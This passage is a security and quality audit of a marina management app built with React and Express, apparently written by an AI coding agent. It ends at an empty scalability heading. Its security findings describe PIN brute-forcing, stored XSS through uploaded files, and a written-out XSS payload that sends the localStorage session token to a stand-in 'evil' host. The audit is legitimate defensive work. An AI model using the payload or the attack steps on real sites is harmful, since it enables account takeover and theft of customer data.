# Campbell's Landing Marina — Multi-Angle Codebase Audit

- Date: 2026-09-24
- Scope: full repo (React 19 + Vite 8 + Express 4, better-sqlite3/mysql2, tesseract.js OCR, vite-plugin-pwa)
- Threat model: **internet-facing** live site (GoDaddy). DB: **MySQL is the real production target**; SQLite is local/dev/legacy.
- Read-only recon. Nothing modified. There is **no test, lint, typecheck, or CI setup** in the repo (verified) — all checks below are manual.
- Severity = impact x likelihood (Critical / High / Medium / Low).
- Note: the requested path `.opencode/review-summary.md` is blocked by the active plan-mode permission, so this file lives at `.opencode/plans/review-summary.md` with identical content.

## Angle 0: Architecture Map

**Entry / boot**
- `src/main.jsx:4-32` — on every load, `checkVersion()` hits `/api/version`; on mismatch it wipes **all** `marina_*` localStorage (incl. the auth token), deletes all caches, unregisters all service workers, then reloads. This is the whole "update" mechanism.
- `src/App.jsx:18-29` — if `?wo=<token>` is present it renders the public customer view; otherwise it gates on `AuthCtx.employee` (`App.jsx:72`). `AppShell` is only reachable when an employee exists.
- `src/AppShell.jsx` — hand-rolled navigation: `screenStack` array + `popstate`/`beforeunload` dirty guard (`:47-75`) and a required `setDirty` contract that each screen must honor manually.

**Request flow (UI → api → server → db)**
`screen` → `src/api.js::api(method, path)` (`api.js:5-27`, prefixes `/api`, injects `Bearer` from localStorage, auto-logs-out on 401) → `server.js` route → `db/index.js:3-19` selects `db/mysql.js` when `DB_HOST` is set, else `db/sqlite.js`.
- `db/sqlite.js` is a thin adapter: it re-writes SQL dialect at prepare time (`INSERT IGNORE`→`INSERT OR IGNORE`, `REPLACE INTO`, `NOW()`→`datetime('now')`) and boots `schema.sql` in its constructor (`sqlite.js:32-37`).
- `db/mysql.js` is a bare pool: it does **not** run `schema.sql`, so there is no MySQL schema bootstrap at all.

**State ownership**
- Contexts: `AuthCtx` (employee persisted to localStorage; `AuthCtx.jsx:7-22`), `ThemeCtx` (theme/dark persisted; body classes + meta theme-color), `ToastCtx` (single transient toast), `NavCtx` (only `navigate`/`goBack`/`setDirty`).
- **No data/store layer.** Every screen owns its own `useState` + `useEffect` fetch. There is no cache, no query layer, no server-state library.

**Boundaries / leaks (the core structural issue)**
- God-component: `src/screens/CardDetailScreen.jsx` (2018 lines) mixes fetching, optimistic mutation, invoice math, OCR-photo upload, checklist persistence, status-transition rules, and rendering.
- Business rules live in the UI, not the API: e.g. status-transition gating, "who can edit what", and invoice assembly are computed in `CardDetailScreen.jsx` while the server only enforces a shallow protected-key list (`server.js:660-664`).
- Category/type lists are duplicated between `constants.js` and `server.js` (`RECEIVED_ITEMS`, `CONDITIONS`, `SERIAL_TYPES`, cleaning items), so client and server can drift.
- `db/sqlite.js:59-73` fabricates a fake "pool" purely so `backup.js`/export code compiles — the abstraction leaks SQLite-vs-MySQL differences instead of hiding them.

## Angle 1: Technical Debt & Dead Code

Top items by ROI (remove/consolidate before adding anything):

1. **[High] `.opencode/logs/messages.jsonl` (2.9 MB), `prompts.md`, `replies.md`, `sessions.jsonl` are git-tracked** (`git ls-files`). These are raw AI-session logs; they embed file contents, diffs, and any pasted data. They should never be in the repo. Repro: `git ls-files .opencode`. Also `.opencode/.gitignore` exists but does not exclude `logs/`.
2. **[High] `data/local.db-shm` and `data/local.db-wal` are tracked.** `.gitignore:12` only ignores `data/*.db`; the `-wal`/`-shm` sidecars are committed and currently show as modified (`git status`). The WAL can contain live rows. Repro: `git ls-files data`.
3. **[Medium] Unused build deps: `tailwindcss`, `autoprefixer`, `postcss`** (`package.json:28-31`). `tailwind.config.js` and `postcss.config.js` are literally `module.exports = {}` and nothing imports Tailwind/`@apply` (verified grep over `src/` and `index.html`). All styling is hand-written CSS inside `index.html`. Dead dependencies inflate install/build and mislead maintainers.
4. **[Medium] `db/sqlite.js:59-73` fake pool + dialect string-rewriting** exists only so MySQL-oriented `backup.js`/export code runs. It is a leaky abstraction that hides real engine differences (see A3).
5. **[Medium] Inline one-shot migrations + seeding in `server.js:31-213`** — ~180 lines of `ALTER TABLE ... catch {}` plus product/template/admin backfills run on every boot. This is a migration system without a version table; it silently swallows all errors (`server.js:34,41,48,...`).
6. **[Medium] Duplicated logic:**
   - Customer/boat create+select flows duplicated and divergent between `ScanCardScanner.jsx:252-297` and `NewCardScreen.jsx:37-107` (only one handles 409; different boat fields).
   - Invoice "add completed work" duplicated (`CardDetailScreen.jsx:691-720` vs `:838-867`), task `toggle` duplicated (`:578-627` vs `:869-916`), products JSON parsing repeated 4x.
7. **[Medium] Oversized god-files:** `CardDetailScreen.jsx` 2018 lines, `server.js` 1113, `ScanCardScanner.jsx` ~630, `AdminScreen.jsx` ~480, `index.html` 1092 (all CSS inline). No module boundaries.
8. **[Low] Dead state / dead code:** `ScanCardScanner.jsx:125,440` `showRawOcr` is never set (the "Show Raw OCR Text" summary is misleading); `ScanCardScanner.jsx:115` destructures unused `employee`; `CustomerViewScreen.jsx:90` `statusIdx` computed and unused; `CardDetailScreen.jsx:603` unreachable `if (field === 'notes') return`.
9. **[Low] Stale config:** `.env.example:1-9` documents `GEMINI_API_KEY` and `APP_URL` that no code references (dead AI Studio template). Misleads deployment setup.
10. **[Low] Reload/refresh hacks + bypassed API client:** `SettingsScreen.jsx:53` and `main.jsx:27` use `window.location.href = window.location.href`; `SettingsScreen.jsx:17,22,30` use raw `fetch('/api/...')` and re-implement the 401 logout already in `api.js:17-21`.

Also: `SwipeableTask.jsx` is named for a swipe gesture but implements click-to-toggle only (no touch handlers) — misleading abstraction (`SwipeableTask.jsx:8-24`).

**Running totals — Angle 1: Critical 0, High 2.**

### Cross-references
- Item 3 relates to Angle 7 (bundle/build cost).
- Item 4 relates to Angle 3 (DB parity) and Angle 8 (fresh MySQL deploy has no schema).
- Items 1-2 relate to Angle 4 (secrets/data exposure).
- Item 6 relates to Angle 6 (god-files / duplication).

## Angle 2: Wide Bug Test (Bug Hunter)

### Critical
- **[Critical] `src/screens/CustomersScreen.jsx:79` and `src/screens/BoatsScreen.jsx:252` — delete always fails (double `/api`).** `api()` prepends `/api` (`api.js:16`), so `api('DELETE', '/api/customers/5')` requests `/api/api/customers/5` → 404. Repro: People → trash → confirm → toast "Failed to delete customer"; Boats → trash → same. Confirmed by reading both call sites (all other calls omit the `/api` prefix).
- **[Critical] Data loss — invoice overwrite after a swallowed GET failure.** `CardDetailScreen.jsx:103-120` loads the invoice with `.catch(() => ({ items: [] }))`; completing a task then builds `PUT /cards/:id/invoice` from that empty state (`:694-716`, `:841-863`). Repro: make `GET /cards/:id/invoice` fail (offline blip / 500), complete any service task → server `DELETE`s all `invoice_items` and re-inserts only the new row (`server.js:870-877`). Silent financial data loss.

### High
- **[High] `server.js:712-718` `toMysqlDateTime` emits an invalid timestamp.** The template omits the separator between date and time: `...${pad(d.getDate())}${pad(d.getHours())}...` → `2026-09-2413:05:00`. Used for `authorized_work.completed_at` (`server.js:727`) and `checklist_completions.completed_at` (`:941,944`). Repro: complete a task → PUT `/cards/:id/work`. On strict MySQL the write 500s; otherwise the value is garbage. (SQLite stores the malformed text as-is.)
- **[High] Deleting a work log with parts fails.** `server.js:907-910` deletes only `work_logs`; `parts_used` has `FOREIGN KEY (work_log_id) REFERENCES work_logs(id)` (`schema.sql:137`) and FKs are enabled (`sqlite.js:34`; InnoDB enforces too). Repro: add a work entry with a product, then delete it → FK violation → 500. No cascade and no child delete.
- **[High] Local (SQLite) server cannot boot on most days.** `server.js:29` awaits `runBackup(db)` before any try/catch; `db/backup.js:24-26` queries `information_schema`, which SQLite cannot prepare. I verified with better-sqlite3: `THROWS: no such table: information_schema.tables`. Repro: `npm run dev` with no `DB_HOST` and no `backup/<today>.sql` → `Failed to start` → `process.exit(1)`. (Production MySQL unaffected → dev-only impact, hence High not Critical.)
- **[High] `ScanCardScanner` card creation is non-atomic.** `:304-343` creates the card, then `PUT /items`, `PUT /work`, and the photo upload as separate requests. Any later failure shows "Failed to create card" although the card exists, and retry creates a **duplicate**. Repro: block the photo request (network) after card creation.
- **[High] Camera stream leak.** `ScanCardScanner.jsx:158-180`: if the component unmounts before `getUserMedia` resolves, cleanup runs before `streamRef.current` is set, so the stream is never stopped (camera stays on). Additionally `setTimeout(startCamera, 100)` at `:207,374` is never cleared → can open a stream after unmount. Repro: tap Scan then immediately navigate back.
- **[High] OCR race / stale state.** `ScanCardScanner.jsx:410-415` "Retake" is not disabled during OCR; an in-flight `runOcr` (`:203-249`) then overwrites `form`, `receivedItems`, `authorizedWork`, and forces `phase='edit'` from the discarded image. Also no unmount guard: `setOcr*`/`setForm`/`setPhase` fire after navigation.
- **[High] Silent field loss in scanner.** `ScanCardScanner.jsx:575-595` exposes editable `motor_type`, `boat_name`, `licence`, `phone`, `length`, but `createCard` (`:304-313`) never sends them when an existing boat is selected. Repro: scan an existing card, fix the phone, save → change discarded.
- **[High] Dead duplicate-customer handling in `NewCardScreen.jsx:76-84`.** It checks `e.status === 409`, but `api()` throws a plain `Error` with no status (`api.js:23-26`) → branch is unreachable; a 409 surfaces as a generic failure. Verified.
- **[High] Card `work` state never re-syncs (optimistic desync).** `CardDetailScreen.jsx:472,572,824` initializes once from `card.authorized_work`; on save failure the code calls `reload()` but never rebuilds local state, so a failed toggle stays visually applied. `toggleUnwrap` (`:826-835`) has no rollback at all.

### Medium
- **[Medium] Work-order numbers can duplicate under concurrency.** `/api/next-work-order-number` (`server.js:845-849`) computes MAX+1 and `POST /cards` (`:609-650`) accepts a client-supplied `work_order_no` with no uniqueness constraint or transaction. Repro: two clients create cards simultaneously → same `WO-####`.
- **[Medium] Checklist photo never displays.** `CardDetailScreen.jsx:1286-1297`: `catPhotoKey` is already `checklist_<slug>`, and `uploadCatPhoto` prefixes `checklist_` again → stored as `checklist_checklist_<slug>`, which never matches the lookup at `:1287`.
- **[Medium] Checklist `completed_at` never set for fall/spring.** Server checks `Object.values(items).every(v => v === true)` (`server.js:938`), but the client stores `{rating, notes}` objects for fall/spring items (`CardDetailScreen.jsx:1205,1216`) → assignments never auto-clear.
- **[Medium] Re-fetch storms / out-of-order responses.** No debounce + no AbortController: `CustomersScreen.jsx:16-24`, `BoatsScreen.jsx:25-33`, `NewCardScreen.jsx:41`, `ScanCardScanner.jsx:252-258`. A slow earlier response can overwrite a newer one.
- **[Medium] `CustomerDetailScreen.jsx:20-28` filters cards by customer *name* string** and boats by `b.name`. Repros: two customers with the same name → wrong cards; a customer renamed in one place → cards missing; two boats with the same name → wrong filter.
- **[Medium] `NewLogScreen`: unvalidated and lossy.** `params.cardId` unchecked → `/cards/undefined/logs` (`:62`); saving during recording persists interim transcript (`:59,64`); rows with a quantity but no product are silently dropped (`:65-69`); `setSaving(false)` after `goBack()` (`:71-75`).
- **[Medium] `CardDetailScreen.jsx:1486-1499` invoice quantity `Number('')` → `NaN`** totals (`$NaN`); `value={item.quantity || 1}` (`:1691`) hides a real 0.
- **[Medium] `ProductAutocomplete.jsx:51-52` debounce timer never cleared on unmount** → `search()` setState after unmount; stale results can overwrite a newer query.
- **[Medium] OCR heuristics over-match.** `ScanCardScanner.jsx:71` regex includes `\s`, so any label line containing a space counts as "checked"; `:104-107` treats any 5-6 digit run in the OCR text as a work-order number (phones/dates/prices).
- **[Medium] `App.jsx:40-42` `appinstalled` listener added with no cleanup.**
- **[Medium] `capturePhoto` can store an empty image.** `ScanCardScanner.jsx:189-198` never checks `video.videoWidth > 0`; if metadata isn't loaded the canvas is 0x0 and `toDataURL()` yields `"data:,"`, which is then uploaded.
- **[Medium] `videoRef.current.play()` promise ignored** (`ScanCardScanner.jsx:173-176`) → possible unhandled rejection, no play verification.

### Low
- `CardDetailScreen.jsx:1047-1053` — pickup-delivery control is shown to non-editor roles but the server rejects them (`server.js:661`) → guaranteed 403.
- `CardDetailScreen.jsx:1863-1872,1884-1906` — `status` is not a protected key, so any role can set any status via the stage chips, bypassing the gated advance/retreat buttons.
- `CardDetailScreen.jsx:753-756` — first tap on an uncompleted task only adds a product; "TAP TO COMPLETE" needs two taps.
- `CardDetailScreen.jsx:438-443` — received-item toggles have no in-flight guard (overlapping PUTs).
- `SwipeableTask.jsx:8-24` — completion toggle ignores the `authorized` prop (latent; all callers pass `true`).
- `ScanCardScanner.jsx:246-249` — `setOcrLoading(false)` not in `finally`; OCR failure not distinguished from engine-load failure.
- `NewCardScreen.jsx:222,235` — renders literal `undefined` for null `motor_type`/`model`.

### Manual test matrix (flows)
| Flow | Result | Evidence |
|---|---|---|
| Login (PIN) | Works; brute-forceable | `server.js:268-280`, A4 |
| Create card (form) | Works | `NewCardScreen.jsx` |
| Create card (scan) | Partial-create duplicates possible; and this is **OCR, not QR** — no QR decoding exists anywhere; `qr-code-styling` only *generates* QRs (`QrCode.jsx`) | `ScanCardScanner.jsx:304-343` |
| Upload photo | Works; stored-XSS via extension | `server.js:228-235`, A4 |
| Edit card | Works; mechanic can set any status; optimistic desync on error | `CardDetailScreen.jsx` |
| Delete card | **No delete-card route exists** at all | `server.js` route list |
| Customer CRUD | Create/read/update work; **delete always 404** | `CustomersScreen.jsx:79` |
| Admin actions | Work; no client role guard | A5/A4 |
| Offline / reconnect | SW returns `503 {error:'Offline'}` (`sw.js:8-17`); UI shows generic errors; no write queue / retry | `sw.js` |

**Running totals — Angle 2: Critical 2, High 9.**

### Cross-references
- Double-prefix deletes are the same root cause as Angle 4 authorization gaps (dead endpoints mask missing security testing).
- `toMysqlDateTime` relates to Angle 3 (MySQL datetime handling).
- SQLite boot crash + export are Angle 3/8.
- Optimistic desync and invoice overwrite are Angle 6 (no state layer) and Angle 5 (no error states).
- Checklist `completed_at` is Angle 3 (client/server contract drift).

## Angle 3: Data Integrity & DB Engine Parity

### High
- **[High] No transactions anywhere.** Verified grep for `transaction|BEGIN|COMMIT|savepoint` across `server.js` and `db/` returns nothing. Multi-statement writes commit incrementally, so a mid-way failure leaves partial data:
  - `POST /api/cards` (`server.js:632-648`): card + 9 `received_items` + N templates + 6 `condition_assessment` + `status_history`.
  - `PUT /api/boats/:id` (`:501-506`): deletes all serials, then re-inserts one at a time.
  - `PUT /api/cards/:id/invoice` (`:870-877`): deletes all invoice items, then re-inserts.
  - `PUT /api/cards/:id/work` (`:720-728`): loops `REPLACE` per service item.
  Repro: kill the process (or force a later statement to fail) mid-request → orphaned/partial rows.
- **[High] MySQL has no schema bootstrap and `schema.sql` is SQLite-only.** `db/mysql.js:42-53` never executes any schema; `db/schema.sql` uses SQLite syntax (`INTEGER PRIMARY KEY AUTOINCREMENT`, `TEXT`, `datetime('now') -- :2,8,26`). On boot the server only runs `ALTER TABLE` (`server.js:31-100`, which require the tables to already exist) and creates `boat_serials` (`:102-113`). A fresh MySQL database therefore has no tables; every query 500s. The "swappable engine" claim is not real: the two engines do not share a schema.

### Medium
- **[Medium] Engine parity is achieved by brittle string rewriting, not abstraction.** `db/sqlite.js:44-53,63-66` only rewrites `INSERT IGNORE`, `REPLACE INTO`, and `NOW()`. Other MySQL-isms pass through unchanged: `CAST(... AS UNSIGNED)` (`server.js:146,846,852`), `SHOW TABLES` (`:1039`), `information_schema`/`SHOW CREATE TABLE` (`backup.js:24,33`), `JSON_EXTRACT` (`:987`). Any of these breaks (or silently changes affinity) on the engine it wasn't written for.
- **[Medium] Backup/export are MySQL-only and non-transactional.** `db/backup.js` is called at boot (`server.js:29`) and uses `information_schema` + `SHOW CREATE TABLE`; `/api/export` uses `SHOW TABLES`. Both throw on SQLite (see A2 High). Backups read table-by-table with separate queries (`backup.js:30-56`) — no snapshot/transaction — so a concurrent write yields a torn backup. Retention: only the newest 2 files are surfaced (`server.js:1068-1078`); old files are never pruned.
- **[Medium] Soft-delete integrity holes.** Deleting a customer (`server.js:381-385`) sets only `customers.deleted_at`; its boats and service cards stay active. `/api/boats` (`:415-435`) and `CARD_SELECT` (`:552-562`) join `boats`/`customers` with **no `deleted_at IS NULL` filter**, so deleted customers' and deleted boats' records keep appearing in lists and cards. Repro: delete a customer → their boats still show in `/api/boats`.
- **[Medium] No `busy_timeout` for SQLite.** `db/sqlite.js:32-34` sets WAL + foreign_keys but not `busy_timeout`; concurrent writes can raise `SQLITE_BUSY`. Dev-only.
- **[Medium] Missing indexes on hot foreign keys / filters.** No indexes on `service_cards.boat_id`, `service_cards.status`, `service_cards.updated_at`, `photos.card_id`, `work_logs.card_id`, `boat_assignments.employee_id`, `customers.email`/`phone`. Lists scan and sort full tables; `ORDER BY sc.updated_at DESC` has no supporting index.
- **[Medium] N+1 / full-table loads.**
  - `GET /api/cards/:id` issues one `parts_used` query **per work log** (`server.js:589-591`).
  - `attachSerials` (`:392-402`) selects the entire `boat_serials` table on **every** boats query and filters in JS.
  - No pagination on `/api/cards`, `/api/boats`, `/api/customers`, `/api/products`.
- **[Medium] App-level uniqueness races.** Duplicate detection for customers (`server.js:349-358`) and boats (`:443-451`) is read-then-insert with no DB unique constraint, so concurrent creates both pass. `work_order_no` has no unique index either (see A2).

### Low
- **[Low] Date handling drift:** SQLite stores timestamps as text (`TEXT DEFAULT (datetime('now'))`) while MySQL uses `DATETIME`; combined with the malformed `toMysqlDateTime` (A2) this yields inconsistent, sometimes unparseable values.
- **[Low] `deleted_at` is `TEXT` in both engines** but compared/assigned with `datetime('now')` on SQLite and `NOW()` on MySQL — two different ISO formats in the same column.

### Explicitly clean
- **SQL injection: none found.** Every user-controlled value is bound via `?` placeholders; the only interpolated SQL identifiers are fixed column names built from server-side whitelists (`server.js:308-323,366-376,488-499,824-833`) or table names read from the DB catalog (`backup.js:34,41`). No request data is ever concatenated into SQL. This angle's injection concern is falsified.

**Running totals — Angle 3: Critical 0, High 2.**

### Cross-references
- Relates to Angle 1 item 5 (migrations-as-try/catch) and Angle 8 (fresh deploy bootstrap).
- Relates to Angle 2 (malformed timestamps, work-order duplication).
- Relates to Angle 4 (no-transaction/partial-write behavior can be abused to desync records).

## Angle 4: Security Review

Assume every input is attacker-controlled and the site is reachable from the internet.

### Critical
- **[Critical] `server.js:268-280` — PIN login is trivially brute-forceable.** PIN is exactly 4 digits (`:300,314`), the login route has **no rate limiting or lockout**, and a seeded default admin exists (`:202-205`, `PIN 0000`, also printed at `:1103`). Exploit: loop `POST /api/auth/login {"pin":"0000"}` over `0000-9999`; worst case 10,000 requests yields an admin token. The default admin may still have PIN `0000` in production. This is the single highest-risk issue.
- **[Critical] `server.js:228-235` — uploaded files keep the attacker's extension → stored XSS.** multer has a size limit only; there is no MIME/type/extension whitelist, and the filename reuses `path.extname(file.originalname).toLowerCase()` (`:232`). `/photos` is served by `express.static` (`:222`), which sets `Content-Type` from the extension. Exploit: authenticate (trivially, see above), `POST /api/cards/:id/photos` with a file named `x.html` (or `x.svg` containing `<script>`) → `GET /photos/x.html` executes JS on the app origin → read `localStorage.marina_token` → account takeover.
- **[Critical] `src/screens/CardDetailScreen.jsx:1531` (and `:1948`) — stored XSS in print windows.** `openPrint` writes an HTML string with **unescaped** customer fields (`card.customer_name`, `card.address`, `card.customer_phone`, `card.boat_name`, `i.description`, invoice number) into `window.open('', '_blank').document.write(...)`. Exploit chain: any authenticated user creates a product via `POST /api/products` (`server.js:802` is `requireAuth`, not `requireEditor`) named `<img src=x onerror="fetch('//evil/?t='+localStorage.marina_token)">`; it flows into an invoice item (`CardDetailScreen.jsx:691-720`); whoever prints the invoice executes the payload on the app origin. React's default escaping does not apply to `document.write`.

### High
- **[High] Broken access control / IDOR throughout.** Authorization is a shallow role check with no per-record ownership:
  - `DELETE /api/logs/:id` (`server.js:907`) and `DELETE /api/photos/:id` (`:924`) are `requireAuth` only → any user (mechanic/cleaner/wrapper) deletes any card's work log or photo and the underlying file.
  - `GET /api/cards/:id` (`:575`), `/customers/:id` (`:337`), `/boats/:id` (`:474`), `GET /api/employees` (`:293`) expose all customers' PII, all cards, and staff to every authenticated role.
  - `PUT /api/cards/:id` (`:652`) lets non-editors change `status` and `unwrap_done` because they are absent from the protected-key list (`:660-664`); `is_fake` cannot be changed but is accepted on create (`:609`).
  - No route verifies that the requester is assigned to the boat they are mutating.
  Repro: log in as a `cleaner`, call `DELETE /api/photos/1` for someone else's photo → succeeds.
- **[High] `server.js:222` — `/photos` is public and unauthenticated.** Images are served before any auth middleware with no ownership/token gate. Combined with the public-card response leaking filenames (`server.js:1021`), any card's photos are reachable by unauthenticated clients given a URL.
- **[High] `server.js:123-128` — public card tokens are generated with `Math.random()`.** `generateCustomerToken` is the only thing protecting `/api/public/card/:token` (customer name, phone, address, boat, licence, invoice items, status history). `Math.random()` is not cryptographically secure (V8 xorshift128+); its outputs are predictable/recoverable. Use `crypto.randomBytes`. Tokens generated for all cards at boot/backfill (`:130-141`) and on create (`:627-630`).
- **[High] Tokens live in `localStorage` and never expire** (`api.js:1-3`, `server.js:273-274`). No rotation, no expiry column on `device_tokens` (`schema.sql:11-16`), and any XSS (two above) exfiltrates them directly. `Authorization: Bearer` is also sent on every request, so a leaked token is a full session.
- **[High] Committed secrets/session data.** `.opencode/logs/*` (AI session transcripts, 2.9 MB) and `data/local.db-wal` are tracked in git (see A1); the WAL can contain customer PII and the logs can contain pasted content. If the repo is public, this is a broad data exposure.

### Medium
- **[Medium] `server.js:237-239` — PINs are stored as unsalted SHA-256.** A DB leak yields the full 4-digit keyspace instantly via rainbow/brute force. Salted adaptive hashing (bcrypt/argon2) is expected. Also `device_tokens.token` is stored in plaintext (`schema.sql:11-16`).
- **[Medium] No security headers.** No `helmet`; no CSP, `X-Content-Type-Options`, `X-Frame-Options`/`frame-ancestors`, HSTS, or `Referrer-Policy` (verified — no helmet/cors module). No CSP is what makes the `document.write` and uploaded-file XSS trivially exploitable.
- **[Medium] No rate limiting on any route** (verified). Beyond login: `/api/public/card/:token` can be enumerated, and `/api/search` can be hammered.
- **[Medium] `server.js:1007-1030` — unauthenticated public endpoint returns full PII.** Customer name/phone + boat licence + invoice line items + status history incl. employee names, with an ~46-bit non-CSPRNG token and no rate limit.
- **[Medium] `server.js:470` leaks internal error messages** to the client (`e.message`). Most other handlers return a generic 500.
- **[Medium] Attack surface / DoS:** `express.json({ limit: '10mb' })` on all routes (`server.js:215`); 25 MB upload limit with no type filter (`:235`); tesseract OCR is triggered from the UI without bounds — but only on live camera capture (no file upload path), which limits abuse.
- **[Medium] `GET /api/version` is unauthenticated** (`:993`) and reveals build/git info.

### Low / explicitly clean
- React render paths are escaped by default; no `dangerouslySetInnerHTML` exists (verified). The XSS vectors are the two above, not JSX interpolation.
- CORS has no permissive config (no `cors` middleware) — same-origin only, which is correct.
- Logout deletes the token (`server.js:282-286`) and deactivating an employee deletes their tokens (`:319`) — good.
- No SQL injection (proven in A3).

**Running totals — Angle 4: Critical 3, High 5.**

### Cross-references
- Auth brute force amplifies every other High/Critical here (upload XSS, IDOR).
- README instructs deployers to tap the version footer to clear cache; combined with the destructive hidden button this is Angle 5.
- Data-in-repo relates to Angle 1 items 1-2 and Angle 8.
- Missing CSP relates to Angle 5 (no a11y/security baseline) and Angle 8 (release).

## Angle 5: UI/UX + Accessibility Audit

First-time thorough pass. The app is visually consistent (hand-written CSS in `index.html`), but is **mouse/touch-only with almost no accessible names**, and it conflates "error" with "empty" nearly everywhere.

### High
- **[High] Hidden destructive control.** `SettingsScreen.jsx:143-145` renders the app version footer as a `<button>` (`clearCache`) styled to look like passive text ("MARINA MANAGER v… · CAMPBELL'S LANDING"). Tapping it wipes all `marina_*` localStorage (including the auth token), deletes all caches, unregisters the service worker, and reloads (`:41-54`) — with no confirmation and no destructive affordance. The README even instructs users to tap it. Accidental logout + cache wipe.
- **[High] Errors render as empty/infinite states (no error UI).** `CardDetailScreen.jsx:1742-1743,1792` swallows `reload` errors and leaves only an endless shimmer; `CardsScreen.jsx:34-36`, `MapScreen.jsx:10-18`, `NewCardScreen.jsx:41,159`, `BoatsScreen.jsx:37,40`, `AdminScreen.jsx:47-60,166`, `SettingsScreen.jsx:17,25` all `.catch(() => {})` and then show "No X found". A network failure is indistinguishable from genuinely no data, and the user cannot retry. Combined with A2's invoice-overwrite bug this is how silent data loss becomes visible.

### Medium
- **[Medium] Bottom navigation has no labels and no accessible names.** `AppShell.jsx:148-158` renders each nav button with only an icon (`<span className="nav-item-icon">`); there is no visible label and no `aria-label`. Active state is conveyed only by the `.active` class/color. Both a first-use UX problem and a WCAG 4.1.2 failure. (The `label` values in `NAV_ITEMS` at `:18-24` are never rendered.)
- **[Medium] Click targets are `<div onClick>` with no keyboard path.** Rows/cells across `CustomersScreen.jsx:61-64`, `CustomerDetailScreen.jsx:48,73`, `CardsScreen.jsx:125` (`.job-card`), `BoatsScreen.jsx`, `MapScreen.jsx:91-102,162-174`, `AdminScreen.jsx:409,495`, `ScanCardScanner.jsx:470-474,522-526`, `NewCardScreen.jsx:161-169,218-226`, `SwipeableTask.jsx:15-24` have no `role`, `tabIndex`, or key handler. The entire app is unusable by keyboard/switch users.
- **[Medium] Icon-only buttons lack `aria-label`.** `CardDetailScreen.jsx:1145,1292,772,1000,1684,1986`; `BoatsScreen.jsx:243-247,248-259`; `AdminScreen.jsx:325-327`; `NewLogScreen.jsx:119-121`. Screen readers announce them as unlabeled "button".
- **[Medium] Modals are not dialogs.** `ConfirmLeaveDialog.jsx:2-4`, the fullscreen photo modal (`CardDetailScreen.jsx:1425-1438`), and pickers in `BoatsScreen.jsx:266-268` use `div.modal-overlay` with no `role="dialog"`, `aria-modal`, focus trap, or Escape handler. Keyboard focus escapes behind the overlay. `ConfirmLeaveDialog` does at least stop propagation and offers Keep/Discard — the good template the others ignore.
- **[Medium] Touch targets below 44px.** Toggle switch `CardDetailScreen.jsx:528` (44x26); storage grid cells `MapScreen.jsx:99` (`minHeight: 28`, tap-to-navigate); scanner "Change" chips `ScanCardScanner.jsx:505,561` (`fontSize:11`); several icon buttons use `padding: 6` (`CustomersScreen.jsx:71,84`).
- **[Medium] No offline/error experience.** `sw.js:8-17` returns `503 {"error":"Offline"}` for `/api` when offline; callers surface this as a generic failure or empty list. There is no offline banner, no retry, no queued writes — a work-log or checklist save attempted offline is simply lost. `main.jsx:4-32` also silently swallows the failure of the version/update check while offline.
- **[Medium] PWA install prompt is captured but never surfaced.** `App.jsx:13,31-38` stores `beforeinstallprompt` in `installPrompt`, but `App.jsx` never passes it down and `AppShell` never renders an install control — dead state; users get no in-app install affordance.
- **[Medium] Blocking native dialogs instead of the app's own UI.** `CustomersScreen.jsx:28-31` uses three sequential `window.prompt()` calls to edit a customer; deletes use `window.confirm`. Inconsistent with the app's design language and poorly usable on mobile.
- **[Medium] `NewCardScreen.jsx:317-319` creates a FAKE card on a single tap with no confirmation**, and its duplicate-customer path is dead (A2) so the intended guidance never appears.
- **[Medium] Text overflow/truncation is unhandled.** Long customer/boat names in `Bebas Neue` (e.g. `CardsScreen.jsx:128-129`, `CustomerDetailScreen.jsx:51`, `NewCardScreen.jsx:164,221`, `ScanCardScanner.jsx:502,558`) have no `overflow/ellipsis` and can push layout; `CardDetailScreen.jsx:232` renders long addresses/remarks unbounded.
- **[Medium] No success feedback on several saves.** Storage type/location, pickup/delivery, and checklist saves show only failures (`CardDetailScreen.jsx:1038-1053,1200-1219`), unlike `InfoTab`'s "Saved" toast (`:184`) and invoice's "Invoice saved" (`:1520`).
- **[Medium] Stage transitions are unconfirmed and can be skipped.** `CardDetailScreen.jsx:1863-1872,1884-1906` lets a user jump status stages (e.g. to `invoiced`/`archived`) with no confirmation for effectively irreversible transitions.

### Low
- **[Low] Likely WCAG AA contrast failures (not fully verified — needs a contrast pass).** Light theme secondary text `--text3:#7aaabb` (`index.html:43`) on `--bg:#f0f7ff` (`:34`) and accent `--accent:#00b4d8` (`:39`) on white are both low-contrast for body/small text; dark theme `--text3:#3a6e7e` on `--bg:#061a24` (`:71-72`) is similarly dim. These tokens are used widely for placeholders, meta text and icons. I did not compute exact ratios.
- **[Low] Color-only status reinforcement.** `StatusBadge.jsx` includes a text label (so 1.4.1 is arguably met), but the card stripe (`CardsScreen.jsx:126`) and stage chips rely on color to carry meaning.
- **[Low] Icons do not honor the `size` prop.** `Icon.jsx:3,8,…` hardcodes `width/height=20` while the wrapper span uses `size` (`:119-124`), so every `size={12..18}` call renders a 20px glyph overflowing a smaller box.
- **[Low] Form inputs rely on placeholders, not labels.** `ScanCardScanner.jsx:461-467` search; `NewLogScreen.jsx:117` quantity; many `NewCardScreen` fields.
- **[Low] Login screen a11y.** `LoginScreen.jsx:53-57` error is a plain div (no `aria-live`), keypad buttons have no labels, and the loading state only dims keys via `opacity` (`:64`).
- **[Low] Toast not announced.** `ToastCtx.jsx:18` renders a plain `div.toast` with no `role="status"`/`aria-live`.
- **[Low] Dark-mode parity nits.** Hardcoded `#fff`/`#888`/`#000` in `AdminScreen.jsx:273`, `SettingsScreen.jsx:76`, `BoatsScreen.jsx:204`, `CustomerViewScreen.jsx:17,99,102,157`, `SwipeableTask.jsx:19,44`. Mostly sit on colored backgrounds so they don't visibly break, but they bypass theme variables.
- **[Low] Version footer / sign-out placement.** `SettingsScreen.jsx:138-141` Sign Out has no confirmation; the destructive footer sits directly below it, increasing mis-tap risk.
- **[Low] `MapScreen.jsx:55,144` view state can go stale** when filtered data becomes empty, so the view toggle no longer reflects what is shown.
- **[Low] `AdminScreen.jsx:270-285` employees tab has no empty-state text** (other tabs do), and `:252` uses `type="number" maxLength={4}` (maxLength ignored on number inputs).

**Running totals — Angle 5: Critical 0, High 2.**

### Cross-references
- Error-as-empty behavior is the user-visible face of Angle 2's swallowed errors and Angle 4's missing error handling.
- Hidden destructive button + no confirmation relates to Angle 4 (session/cache) and Angle 8 (release safety).
- Contrast/size issues connect to `Icon.jsx` in Angle 1 (dead/incorrect abstraction).

## Angle 6: Architecture Scalability

Assume 10x: more boats, cards, customers, photos, users, and concurrent techs. Ignore syntax; this is about what the structure forces.

### High
